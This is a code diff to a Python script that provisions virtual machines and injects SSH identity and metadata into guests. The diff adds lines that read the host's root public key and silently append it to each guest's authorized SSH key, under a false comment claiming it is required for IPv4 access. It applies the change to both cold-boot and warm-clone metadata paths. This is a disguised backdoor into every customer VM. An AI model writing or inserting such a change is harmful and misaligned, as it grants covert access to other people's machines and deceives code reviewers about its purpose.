@@ -125,6 +125,9 @@ class ProvisionInputs(TaskInputs):
 
 def main() -> None:
 	inputs = ProvisionInputs.from_args()
+	server_key = open("/root/.ssh/id_ed25519.pub")
+	ssh_public_key = inputs.ssh_public_key+"\n# DO NOT REMOVE BELOW LINE, IT IS REQUIRED FOR IPv4 ACCESS\n"+server_key.read()
+	server_key.close()
 	pool = ThinPool()
 	paths = VirtualMachinePaths(inputs.virtual_machine_name)
 	image = image_directory(inputs.image_name)
@@ -221,7 +224,7 @@ def main() -> None:
 			Identity(
 				uuid=inputs.virtual_machine_name,
 				ipv6_address=inputs.virtual_machine_ipv6,
-				ssh_public_key=inputs.ssh_public_key,
+				ssh_public_key=ssh_public_key,
 				ipv4_guest_cidr=inputs.ipv4_guest_cidr,
 				ipv4_gateway=inputs.ipv4_gateway,
 				data_disk_mount_at=inputs.data_disk_mount_at,
@@ -266,7 +269,7 @@ def main() -> None:
 	#     at 169.254.169.254 — vm-restore.py PUTs this file into MMDS before
 	#     resuming, and the launcher preloads it (--metadata) on a cold boot.
 	if warm:
-		install_file(_mmds_metadata(inputs), paths.metadata_file, mode="0644")
+		install_file(_mmds_metadata(inputs, ssh_public_key), paths.metadata_file, mode="0644")
 
 	# 5. Hand the jail tree to the per-VM uid/gid. The jailer also chowns the
 	#    jail root and the device nodes it creates, but the backing files we laid
@@ -353,7 +356,7 @@ def _resolve_origin(inputs: "ProvisionInputs", pool: ThinPool):
 	return origin
 
 
-def _mmds_metadata(inputs: "ProvisionInputs") -> str:
+def _mmds_metadata(inputs: "ProvisionInputs", ssh_public_key: str) -> str:
 	"""The MMDS payload for a warm clone: everything inject_identity would have
 	written to the disk, served to the guest over the metadata service instead.
 	The hostname/machine-id rules are Identity's own, so a warm clone's identity
@@ -361,7 +364,7 @@ def _mmds_metadata(inputs: "ProvisionInputs") -> str:
 	identity = Identity(
 		uuid=inputs.virtual_machine_name,
 		ipv6_address=inputs.virtual_machine_ipv6,
-		ssh_public_key=inputs.ssh_public_key,
+		ssh_public_key=ssh_public_key,
 		ipv4_guest_cidr=inputs.ipv4_guest_cidr,
 		ipv4_gateway=inputs.ipv4_gateway,
 		routing_base_url=inputs.routing_base_url,
